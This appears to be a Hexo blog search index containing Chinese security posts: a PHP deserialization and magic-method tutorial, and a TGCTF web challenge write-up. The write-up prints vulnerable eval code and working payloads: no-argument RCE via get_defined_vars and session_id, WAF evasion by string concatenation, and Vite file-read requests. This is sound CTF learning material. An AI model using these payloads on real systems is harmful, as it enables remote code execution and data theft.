<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2025/05/13/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/05/13/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>反序列化漏洞（Deserialization Vulnerability）是一种安全漏洞，存在于应用程序中对数据进行反序列化操作的过程中。当应用程序接收到外部传递的恶意序列化数据并进行反序列化时，攻击者可以利用这个漏洞执行未经授权的代码或导致应用程序受到攻击。</p><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>既然是反序列化的话，首先要了解什么是序列化和反序列化以及他们的区别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化：就是将对象转化为字符串进行存储 class S&#123;`    `public $test=&quot;pikachu&quot;;``&#125;``   ``$s=new S();     //创建一个对象``   ``serialize($s);     //把这个对象进行序列化``   ``序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;`    `O:代表object`    `1:表示该对象的类名的字节数（即类名长度为1）`    `S:对象的名称`    `1:表示该对象有 1 个属性。`    `s:数据类型`    `4:变量名称的长度`    `test:变量名称`    `s:数据类型`    `7:变量值的长度`    `pikachu:变量值</span><br><span class="line">反序列化：就是将字符串转化为对象 $u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);``   ``echo $u-&gt;test; //得到的结果为pikachu (注意是echo)反序列化使用 unserialize () 函数将字符串转换为对象，序列化使用 serialize () 函数将对象转化为字符串； 反序列化不触发类的成员方法，需要调用方法后才能触发</span><br><span class="line">反序列化漏洞：就是在反序列化过程中，如果恶意者可以对将要转换的字符串进行操控，从而达到任意代码执行的操作</span><br></pre></td></tr></table></figure><p>而反序列化漏洞的主要原理是应用程序在反序列化过程中没有对传入的数据进行足够的验证和过滤，导致攻击者可以利用构造的恶意序列化数据来执行任意代码或远程代码执行攻击。</p><h2 id="PHP面向对象的基础："><a href="#PHP面向对象的基础：" class="headerlink" title="PHP面向对象的基础："></a>PHP面向对象的基础：</h2><h3 id="1-过程："><a href="#1-过程：" class="headerlink" title="1.过程："></a>1.过程：</h3><p>面向过程是一种以“整体事件”为中心的编程思想，编程的时候把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数；</p><h3 id="2-对象："><a href="#2-对象：" class="headerlink" title="2.对象："></a>2.对象：</h3><p>面向对象是一种以“对象”为中心的编程思想，把要解决的问题分解成各个“对象”；对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象；</p><p>对象的三个特征：对象的行为，对象的形态，对象的表示</p><h3 id="3-类的定义："><a href="#3-类的定义：" class="headerlink" title="3.类的定义："></a>3.类的定义：</h3><p> 类是定义了一件事物的抽象特点，它将数据的形式以及这些数据上的操作封装在一起；对象是具有类类型的变量，是对类的实例；</p><p>类的定义包括定义类名、定义成员属性、定义成员方法； 内部构成：成员属性(变量)+成员方法(函数)</p><h3 id="4-继承："><a href="#4-继承：" class="headerlink" title="4.继承："></a>4.继承：</h3><p>继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系；</p><pre><code>    在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把一个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容；</code></pre><p>父类：一个类被其它类继承，可将该类成为父类，或基类，超类；</p><p>子类：一个类继承其他类称为子类，也可称为派生类；</p><h3 id="5-权限修饰符："><a href="#5-权限修饰符：" class="headerlink" title="5.权限修饰符："></a>5.权限修饰符：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>：公共的，在类的内部、子类和类的外部中都可以被调用；</span><br><span class="line"><span class="keyword">protected</span>：受保护的，在类的内部和子类可以被调用，在类的外部不可调用；</span><br><span class="line"><span class="keyword">private</span>：私有的，只能在类的内部调用，在子类和类的外部不可调用；</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">举个栗子：<span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">//成员属性</span></span><br><span class="line">    <span class="comment">//方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">wea5e1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$we</span>=<span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a5</span>=<span class="string">&#x27;222&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$e1</span>=<span class="string">&#x27;333&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">wea5e1</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; we = <span class="string">&#x27;444&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;wea5e1&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;we&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;444&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;%00*%00a5&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;222&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;%00wea5e1%00e1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;333&quot;</span>;&#125;</span><br><span class="line">可以发现这个权限<span class="keyword">protected</span>会在他的成员那里加上去%<span class="number">00</span>*%<span class="number">00</span>，而<span class="keyword">private</span>则会加%<span class="number">00</span>类的名字%<span class="number">00</span></span><br><span class="line">一般格式：</span><br><span class="line">变量类型：类名长度：类名：属性数量:&#123;属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容&#125;</span><br></pre></td></tr></table></figure><h3 id="6-类型描述"><a href="#6-类型描述" class="headerlink" title="6.类型描述"></a>6.类型描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a   array 数组型</span><br><span class="line">b   boolean 布尔型</span><br><span class="line">d   double 浮点型</span><br><span class="line">i   integer 整数型</span><br><span class="line">o   common object 共同对象</span><br><span class="line">r   object reference 对象引用</span><br><span class="line">s   non-escaped binary string 非转义的二进制字符串</span><br><span class="line">S   escaped binary string 转义的二进制字符串</span><br><span class="line">C   custom object 自定义对象</span><br><span class="line">O   class 对象</span><br><span class="line">N   null 空</span><br><span class="line">R   pointer reference 指针引用</span><br><span class="line">U   unicode string Unicode 编码的字符串</span><br></pre></td></tr></table></figure><h3 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct() 构造函数，当一个对象创建时被调用。（实例化时） </span><br><span class="line">__destruct() 析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行  </span><br><span class="line">__toString 当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串  </span><br><span class="line">__wakeup() 调用unserialize()时触发，反序列化恢复对象之前调用该方法，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。  </span><br><span class="line">__sleep() 调用serialize()时触发 ，在对象被序列化前自动调用，常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误  </span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法  </span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发  </span><br><span class="line">__get() 用于从不可访问的属性读取数据，即在调用私有属性的时候会自动执行  </span><br><span class="line">__set() 用于将数据写入不可访问的属性  </span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发  </span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发  </span><br><span class="line">__invoke() 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h4 id="construct"><a href="#construct" class="headerlink" title="construct():"></a>construct():</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">构造函数，当一个对象创建时被调用。（实例化时）举个栗子：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wea5e1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;construct方法触发&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wea5e1</span>();</span><br><span class="line"><span class="comment">//construct 方法触发</span></span><br></pre></td></tr></table></figure><h4 id="destruct"><a href="#destruct" class="headerlink" title="destruct():"></a>destruct():</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行 举个栗子：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wea5e1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct方法触发&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wea5e1</span>(); <span class="comment">//destruct方法触发</span></span><br></pre></td></tr></table></figure><p>虽然这两个的方式差不多但是二者优先级不一样</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">举个栗子：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wea5e1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;construct方法触发&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct方法触发&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">wea5e1</span>(); <span class="comment">//construct方法触发destruct方法触发</span></span><br></pre></td></tr></table></figure><h4 id="tostring"><a href="#tostring" class="headerlink" title="tostring():"></a>tostring():</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当一个对象被当作一个字符串被调用，把类当作字符串使用时触发，返回值需要为字符串 举个栗子：</span><br><span class="line">&lt;?php</span><br><span class="line">class me&#123;</span><br><span class="line">    public $name=&quot;wea5e1&quot;;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;__toString方法已触发&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a  = new me();</span><br><span class="line">//echo $a;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo serialize($a);//O:2:&quot;me&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;wea5e1&quot;;&#125;</span><br><span class="line">取消echo $a的注释的话 //__toString方法已触发</span><br><span class="line">O:2:&quot;me&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;wea5e1&quot;;&#125;</span><br></pre></td></tr></table></figure><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="wakeup():"></a>wakeup():</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用unserialize()时触发，反序列化恢复对象之前调用该方法，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。(这里有个绕过)举个栗子：</span><br><span class="line">&lt;?php</span><br><span class="line">class me&#123;</span><br><span class="line">    public $name=&quot;wea5e1&quot;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;__wakeup方法已触发&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new me();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$b = unserialize($b); //O:2:&quot;me&quot;:1:&#123;s:4:&quot;name&quot;;s:6:&quot;wea5e1&quot;;&#125;__wakeup方法已触发</span><br></pre></td></tr></table></figure><h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep():"></a>sleep():</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用serialize()时触发 ，在对象被序列化前自动调用，常用于提交未提交的数据，或类似的清理操作。举个栗子：</span><br><span class="line">&lt;?php</span><br><span class="line">class me &#123;</span><br><span class="line">public $name = &quot;wea5e1&quot;;</span><br><span class="line">public $age = 18;</span><br><span class="line"></span><br><span class="line">public function __sleep() &#123;</span><br><span class="line">echo &#x27;__sleep方法已触发&#x27; . PHP_EOL;</span><br><span class="line">return [&#x27;age&#x27;];  // 指定要序列化的属性</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new me();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;  //__sleep方法已触发</span><br><span class="line">O:2:&quot;me&quot;:1:&#123;s:3:&quot;age&quot;;i:18;&#125;</span><br></pre></td></tr></table></figure><h4 id="call"><a href="#call" class="headerlink" title="call():"></a>call():</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用不可访问或不存在的方法时触发 举个栗子：</span><br><span class="line">&lt;?php</span><br><span class="line">class wea5e1&#123;</span><br><span class="line">    public $name=&quot;wea5e1&quot;;</span><br><span class="line">    public $age = &quot;18&quot;;</span><br><span class="line">    public function __call($name, $age)&#123;</span><br><span class="line">        echo &#x27;call触发&#x27;;</span><br><span class="line">        echo &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new wea5e1();</span><br><span class="line">$a -&gt; sb();</span><br><span class="line">echo serialize($a); //call触发</span><br><span class="line">O:6:&quot;wea5e1&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;wea5e1&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这里先讲下get和set(这三个可能经常搞混)</p><h4 id="get"><a href="#get" class="headerlink" title="get():"></a>get():</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用不可访问或不存在的属性是触发 和上面要区分开来 举个栗子：</span><br><span class="line">&lt;?php</span><br><span class="line">class wea5e1&#123;</span><br><span class="line">    public $name=&quot;wea5e1&quot;;</span><br><span class="line">    public $age = &quot;18&quot;;</span><br><span class="line">    public function __get($name)&#123;</span><br><span class="line">        echo &#x27;get触发&#x27;;</span><br><span class="line">        echo &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new wea5e1();</span><br><span class="line">$a -&gt; sb;</span><br><span class="line">echo serialize($a);//get触发</span><br><span class="line">O:6:&quot;wea5e1&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;wea5e1&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><h4 id="set"><a href="#set" class="headerlink" title="set():"></a>set():</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于将数据写入不可访问的属性 举个栗子：</span><br><span class="line">&lt;?php</span><br><span class="line">class wea5e1&#123;</span><br><span class="line">    public $name=&quot;wea5e1&quot;;</span><br><span class="line">    public $age = &quot;18&quot;;</span><br><span class="line">    public function __set($name,$age)&#123;</span><br><span class="line">        echo &#x27;set触发&#x27;;</span><br><span class="line">        echo &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new wea5e1();</span><br><span class="line">$a -&gt; sb = &quot;nb&quot;;</span><br><span class="line">echo serialize($a); //set触发</span><br><span class="line">O:6:&quot;wea5e1&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;wea5e1&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><h4 id="isset"><a href="#isset" class="headerlink" title="isset():"></a>isset():</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当使用 isset 或者是 empty 来检查不存在或者不可访问的属性时触发 </span><br><span class="line">&lt;?php</span><br><span class="line">class wea5e1&#123;</span><br><span class="line">    public $name=&quot;wea5e1&quot;;</span><br><span class="line">    public $age = &quot;18&quot;;</span><br><span class="line">    public function __isset($name)&#123;</span><br><span class="line">        echo &#x27;isset触发&#x27;;</span><br><span class="line">        echo &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new wea5e1();</span><br><span class="line">isset($a-&gt;sb);</span><br><span class="line">echo serialize($a); //isset触发</span><br><span class="line">O:6:&quot;wea5e1&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;wea5e1&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><h4 id="unset"><a href="#unset" class="headerlink" title="unset():"></a>unset():</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 unset() 删除一个不存在或不可访问的属性时触发 举个栗子：</span><br><span class="line">&lt;?php</span><br><span class="line">class wea5e1&#123;</span><br><span class="line">    public $name=&quot;wea5e1&quot;;</span><br><span class="line">    public $age = &quot;18&quot;;</span><br><span class="line">    public function __unset($name)&#123;</span><br><span class="line">        echo &#x27;unset触发&#x27;;</span><br><span class="line">        echo &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new wea5e1();</span><br><span class="line">unset($a-&gt;sb);</span><br><span class="line">echo serialize($a); //unset触发</span><br><span class="line">O:6:&quot;wea5e1&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;wea5e1&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure><h4 id="invoke"><a href="#invoke" class="headerlink" title="invoke()"></a>invoke()</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当将一个对象像函数一样调用时触发 举个栗子：</span><br><span class="line">&lt;?php</span><br><span class="line">class wea5e1&#123;</span><br><span class="line">    public $name=&quot;wea5e1&quot;;</span><br><span class="line">    public $age = &quot;18&quot;;</span><br><span class="line">    public function __invoke($name)&#123;</span><br><span class="line">        echo &#x27;invoke触发&#x27;;</span><br><span class="line">        echo &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new wea5e1();</span><br><span class="line">echo $a(&#x27;s&#x27;);</span><br><span class="line">echo serialize($a); //invoke触发</span><br><span class="line">O:6:&quot;wea5e1&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;wea5e1&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TGCTFweb部分</title>
      <link href="/2025/05/10/TGCTFweb%E9%83%A8%E5%88%86/"/>
      <url>/2025/05/10/TGCTFweb%E9%83%A8%E5%88%86/</url>
      
        <content type="html"><![CDATA[<h1 id="TGCTF"><a href="#TGCTF" class="headerlink" title="TGCTF"></a>TGCTF</h1><h2 id="AAA偷渡阴平"><a href="#AAA偷渡阴平" class="headerlink" title="AAA偷渡阴平:"></a><strong>AAA偷渡阴平</strong>:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;</span><br><span class="line">    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>打开一看发现过滤了一些特殊符号和1和3到9(感觉有点刻意了没有2(😀))这个是eval，正常是使用system的，不过’’””&#96;&#96;都过滤了，正好sun师傅之前让我看看无参数rce，有用场了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(getallheaders());先试试water,可以 不过我还是喜欢使用get_defined_vars()这个，因为第一个是使用heard头，感觉有点麻烦了</span><br><span class="line">var_dump(get_defined_vars());&amp;b=111 发现：</span><br><span class="line">array(5) &#123; [&quot;_GET&quot;]=&gt; array(2) &#123; [&quot;tgctf2025&quot;]=&gt; string(29) &quot;var_dump(get_defined_vars());&quot; [&quot;b&quot;]=&gt; string(3) &quot;111&quot; &#125; [&quot;_POST&quot;]=&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]=&gt; array(1) &#123; [&quot;PHPSESSID&quot;]=&gt; string(32) &quot;26d0ac1ba2391440de04672e76f50b31&quot; &#125; [&quot;_FILES&quot;]=&gt; array(0) &#123; &#125; [&quot;tgctf2025&quot;]=&gt; string(29) &quot;var_dump(get_defined_vars());&quot; &#125; </span><br><span class="line">ok了，可以进行rce了</span><br><span class="line">?tgctf2025=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</span><br><span class="line">?tgctf2025=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;tac /flag&#x27;);</span><br><span class="line">(不过有2的话还可以session_start();system(hex2bin(session_id())); cookie:PHPSESSID=636174202f662a)</span><br></pre></td></tr></table></figure><h2 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）:"></a><strong>AAA偷渡阴平（复仇）</strong>:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;</span><br><span class="line">    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?tgctf2025session_start();system(hex2bin(session_id())); cookie:PHPSESSID=636174202f662a</span><br><span class="line">这个过滤了一些函数之前的肯定使用不了了(毕竟是复仇吗哈哈哈哈)</span><br></pre></td></tr></table></figure><h2 id="前端GAME："><a href="#前端GAME：" class="headerlink" title="前端GAME："></a><strong>前端GAME</strong>：</h2><p>打开是一个消消乐，玩了玩(不过首先肯定是要看一下前端js的)发现只要分数高于17分就显示&#x2F;tgflagggg,不过肯定是直接访问不了的，</p><p>发现了这里的<code>vite</code>想起这里是有一个任意文件读取的漏洞的，在网上看了看，发现CVE-2025-30208，就ok了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &quot;url+?import&amp;raw&quot;(url是你自己访问不了的地址)(不知道为什么在抖音上面看到了，大数据是懂我的)</span><br></pre></td></tr></table></figure><h2 id="火眼辩魑魅："><a href="#火眼辩魑魅：" class="headerlink" title="火眼辩魑魅："></a><strong>火眼辩魑魅</strong>：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">shell学姐会让青春CTF少年脸红吗？只有一个洞是通的，看不出来的话就尝试每个漏洞都试一遍哦，杂鱼~</span><br></pre></td></tr></table></figure><p>额，什么都没有。dirsearch来扫一下，发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: *</span><br><span class="line">Disallow: tgupload.php</span><br><span class="line">Disallow: tgshell.php</span><br><span class="line">Disallow: tgxff.php</span><br><span class="line">Disallow: tgser.php</span><br><span class="line">Disallow: tgphp.php</span><br><span class="line">Disallow: tginclude.php</span><br></pre></td></tr></table></figure><p>因为是shell学姐吗，直接看tgshell.php(其实是手里面有sun师傅独特的rce骚操作(感觉rce的骚姿势都好变态))（其他的后面再补充）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $shell=$_POST[&quot;shell&quot;];</span><br><span class="line">    &#123;</span><br><span class="line">        eval($shell);</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>随便试了试发现有waf，不慌，直接拿sun师傅rce骚操作一个个试(其实可以直接蚁剑直接连接的)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell=$a=&#x27;syst&#x27;.&#x27;em&#x27;;$a(&#x27;ls /&#x27;); ok了；爽了</span><br></pre></td></tr></table></figure><h2 id="前端GAME-Plus："><a href="#前端GAME-Plus：" class="headerlink" title="前端GAME Plus："></a><strong>前端GAME Plus</strong>：</h2><p>(不如pro max)</p><p>这个就又是cve的了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl &quot;http://127.0.0.1:52091/tgflagggg?.svg?.wasm?init&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性总结下</title>
      <link href="/2025/04/24/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93%E4%B8%8B/"/>
      <url>/2025/04/24/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93%E4%B8%8B/</url>
      
